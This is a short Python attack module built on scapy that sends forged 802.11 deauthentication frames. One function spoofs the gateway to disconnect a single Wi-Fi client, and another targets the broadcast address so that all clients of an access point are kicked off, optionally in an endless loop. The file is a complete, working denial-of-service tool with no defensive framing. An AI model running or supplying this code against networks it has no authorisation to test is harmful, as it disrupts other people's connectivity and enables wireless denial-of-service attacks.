from scapy.all import *
import logger

log = None
is_initialized = False


def module_init(main_log: logger.Logger):
    """
    initializes attack modules
    :param main_log: logger
    """
    global log, is_initialized
    log = main_log
    is_initialized = True


def wifi_deauth_host(target, gateway, persist=False):
    log.log_info(f"starting wifi deauth target: {target}", True, True)
    dot11 = Dot11(addr1=target, addr2=gateway, addr3=gateway)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    while True:
        log.log_info(f"sending deauth packet", True, True)
        sendp(packet, inter=0.1, count=100, verbose=False)
        if not persist:
            break


def wifi_deauth_all(gateway, persist=False):
    wifi_deauth_host(ETHER_BROADCAST, gateway, persist)
